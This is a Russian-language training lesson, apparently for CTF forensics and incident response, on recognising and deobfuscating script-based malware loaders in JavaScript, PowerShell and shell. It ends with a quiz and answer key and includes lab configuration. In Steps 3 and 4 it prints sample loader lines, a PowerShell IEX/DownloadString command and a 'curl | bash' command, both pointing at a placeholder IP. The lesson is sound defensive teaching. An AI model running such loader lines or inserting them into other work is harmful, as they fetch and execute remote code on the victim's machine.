---
id: mal-script-js
title: 'Скриптовая малварь: JavaScript, PowerShell и shell'
category: forensics
parent: forensics-malware-families
difficulty: medium
order: 6
tags: [malware, javascript, powershell, shell, obfuscation, forensics]
prerequisites: [forensics-malware-yara]
useful_for:
  - 'CTF Forensics категория'
  - 'DFIR / Incident Response'
  - 'Анализ образов и артефактов'
estimated_minutes: 45
summary: 'Как анализировать скриптовые загрузчики: JavaScript, PowerShell и shell — обфускация, декодирование и типовые цепочки.'
lab:
  kind: shell
  title: 'Практика: Скриптовая малварь'
  toolset: [core, grep, strings]
  workdir: /home/student/task
  files: [task.md]
  check: 'grep -q ''nto{'' answer.txt'
  hints:
    - 'Прочитай файл-артефакт: `cat <файл>`.'
    - 'Ищи строку с меткой nto{.'
    - 'Сохрани: `grep nto <файл> > answer.txt`.'
---

## Вопрос, с которого всё начинается

Малварь всё чаще не бинарник, а **скрипт**: JavaScript, PowerShell, shell. Их легко
обфусцировать и запустить без компиляции. Разберём, как распознать и распутать.

## Наш пример: обфусцированный JS

## Шаг 1: что видно

```
$ head -c 300 sample.js
var _0x1a2b=["\x68\x74\x74\x70...","\x62\x61\x73\x68"...];(function(_0x3c4d,_0x5e6f){...})();
```

Шестнадцатеричные escape-последовательности и случайные имена — классическая
обфускация (обфускатор типа `javascript-obfuscator`).

## Шаг 2: декодируем строки

Строки собираются из hex/массивов. Быстрый способ — выполнить только построение
строк в песочнице (Node.js `vm` без I/O):

```
$ node -e "console.log(Buffer.from('68747470','hex').toString())"
http
```

Или использовать `de4js`/`js-beautify` + ручной разбор. Цель — получить читаемый код.

## Шаг 3: PowerShell

Обфускация в PowerShell — через Base64 и `-EncodedCommand`:

```
PS> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABj...'))
$c = 'http://203.0.113.5/x'; IEX (New-Object Net.WebClient).DownloadString($c)
```

`IEX` + `DownloadString` = скачивание и исполнение. Это ядро «файл-less» атаки.

## Шаг 4: shell-загрузчики

```
$ cat loader.sh
curl -s http://203.0.113.5/x | bash
```

Или через `eval`, `base64 -d`, `nc`. Просто, но эффективно.

## Шаг 5: что искать

- URL и IP;
- команды (`IEX`, `eval`, `curl|bash`);
- кодировки (Base64, hex, gzip);
- вызовы системных API;
- persistence-команды (crontab, Run-ключ).

## Что мы теперь знаем

- Скриптовая малварь = JS/PowerShell/shell-загрузчик.
- Обфускация: hex-строки, случайные имена, Base64.
- `IEX`+`DownloadString` — типовой PowerShell-загрузчик.
- `curl|bash` — простейший shell-загрузчик.
- Декодируй строки в изолированной песочнице.

## Если не сработало

- Многослойная обфускация? Декодируй по слоям.
- Выполнение кода при разборе? Используй статический парсер, не запускай.
- Нужна логика? Динамический анализ в песочнице.

## Квиз

Проверь себя.

```quiz
- question: Какой приём типичен для PowerShell-малвари?
  options:
    - 'SQL-инъекция'
    - 'IEX + DownloadString'
    - 'ARP-спуфинг'
    - 'DNS-туннель'
  answer: 1
  explanation: 'IEX исполняет скачанный скрипт — классический «файл-less» загрузчик.'
- question: Что означает hex-строки в JS?
  options:
    - 'ошибку'
    - 'обфускацию строк'
    - 'шифрование диска'
    - 'сетевой запрос'
  answer: 1
  explanation: 'Обфускаторы прячут строки в escape/hex-последовательностях.'
- question: Что делает curl -s URL | bash?
  options:
    - 'сохраняет файл'
    - 'скачивает и сразу исполняет скрипт'
    - 'шифрует'
    - 'удаляет логи'
  answer: 1
  explanation: 'Пайп в bash исполняет скачанное содержимое.'
- question: Почему опасно просто «запустить» образец?
  options:
    - 'он большой'
    - 'скрипт может выполнить вредоносные действия'
    - 'он старый'
    - 'он бесплатный'
  answer: 1
  explanation: 'Скрипт сразу исполняет код; анализ ведут статически/в песочнице.'
```
